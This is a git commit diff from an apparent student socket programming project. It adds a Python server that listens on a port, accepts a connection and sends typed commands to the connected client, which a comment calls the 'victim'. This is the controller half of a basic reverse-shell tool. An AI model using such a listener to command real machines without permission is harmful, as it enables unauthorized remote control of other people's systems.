952067b12859828c8fd79c168cea8a98ab1f5a41
Nguyen Huu Trung Nhan <nhan.nguyenbkedu@hcmut.edu.vn>
2020-02-15 09:17:04 +0700

    2nd Commit:
    Complete server.py

--- SocketProgrammingProject.py
+++ SocketProgrammingProject.py
@@ -16,4 +16,48 @@ def create_socket():
     except socket.error as msg:
         print("Socket creation error: " + str(msg))
 
+# Binding the socket and Listening for connections
+def bind_socket():
+    try:
+        global host
+        global port
+        global s
+
+        print("Binding the Port: " + str(port))
+
+        s.bind((host, port))
+        s.listen(5)
+
+    except socket.error as msg:
+        print("Socket creation error: " + str(msg) + "\n" + "Retrying...")
+        bind_socket()
+
+# Establish the connection with the client (socket must be listening)
+def socket_accept():
+    conn, address = s.accept()
+    print("Connection has been established: |" + " IP: " + address[0] + " | Port: " + str(address[1]))
+    send_commands(conn)
+    conn.close()
+
+# Send commands to client /victim or a friend
+def send_commands(conn):
+    while True:
+        cmd = input()
+        if cmd == "quit":
+            conn.close()
+            s.close()
+            sys.exit()
+        if len(str.encode(cmd)) > 0:
+            conn.send(str.encode(cmd))
+            client_response = str(conn.recv(1024), "utf-8")
+            print(client_response, end="")
+
+
+# Create the main() function
+def main():
+    create_socket()
+    bind_socket()
+    socket_accept()
+
+main()
 
